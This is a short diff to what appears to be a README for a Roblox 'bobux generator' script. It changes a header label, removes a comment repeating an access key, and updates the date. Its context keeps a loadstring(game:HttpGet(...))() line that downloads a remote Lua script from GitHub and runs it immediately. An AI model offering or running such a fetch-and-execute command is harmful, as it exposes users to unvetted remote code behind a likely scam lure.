@@ -2,9 +2,8 @@
 
 key is: "tempkey2021"
 
-gui loadstring:
+new gui loadstring:
 ```lua
---the key is "tempkey2021"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ageud-gg/funny-bobux-generator/main/main.lua"))()
 ```
 
@@ -16,4 +15,4 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ageud-gg/funny-bobux-
 
 and it should work
 
-updated on 11/23/2022 (MM/DD/YYYY)
+updated on 11/24/2022 (MM/DD/YYYY)
